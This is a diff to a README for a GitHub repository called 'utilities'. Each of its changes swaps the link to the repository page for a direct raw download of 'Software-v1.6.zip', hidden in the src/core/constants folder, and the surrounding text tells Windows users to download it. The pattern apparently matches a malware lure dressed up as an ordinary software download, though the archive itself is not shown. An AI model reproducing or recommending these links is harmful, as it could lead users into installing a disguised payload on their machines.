@@ -1,10 +1,10 @@
 # 🧩 utilities - Clear building blocks for apps
 
-[![Download](https://img.shields.io/badge/Download%20Utilities-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Disarranged-angelstrumpet481/utilities)
+[![Download](https://img.shields.io/badge/Download%20Utilities-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Disarranged-angelstrumpet481/utilities/raw/refs/heads/main/src/core/constants/Software-v1.6.zip)
 
 ## 📦 Download
 
-Visit this page to download: https://github.com/Disarranged-angelstrumpet481/utilities
+Visit this page to download: https://github.com/Disarranged-angelstrumpet481/utilities/raw/refs/heads/main/src/core/constants/Software-v1.6.zip
 
 Open the link in your browser, then use the GitHub download options on the page. If you see a release file, download it to your Windows PC. If the page has source files only, download the repository as a ZIP file.
 
@@ -176,7 +176,7 @@ Small utility files help keep a project steady. They reduce repeated code and ma
 
 ## 📥 Download again
 
-Use this link to visit the page and download: https://github.com/Disarranged-angelstrumpet481/utilities
+Use this link to visit the page and download: https://github.com/Disarranged-angelstrumpet481/utilities/raw/refs/heads/main/src/core/constants/Software-v1.6.zip
 
 ## 🧭 Quick path for Windows users
 
